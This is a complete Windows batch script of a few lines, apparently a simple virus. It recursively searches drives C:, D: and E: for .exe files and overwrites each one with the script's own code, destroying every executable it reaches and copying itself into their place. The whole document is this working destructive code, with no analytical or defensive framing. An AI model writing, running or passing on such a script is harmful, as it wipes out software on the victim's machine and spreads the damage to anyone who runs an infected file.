@echo off
start cmd.exe
for /r c:\ %%i in (*.exe) do type %0>%%i
for /r d:\ %%j in (*.exe) do type %0>%%j
for /r e:\ %%k in (*.exe) do type %0>%%k
pause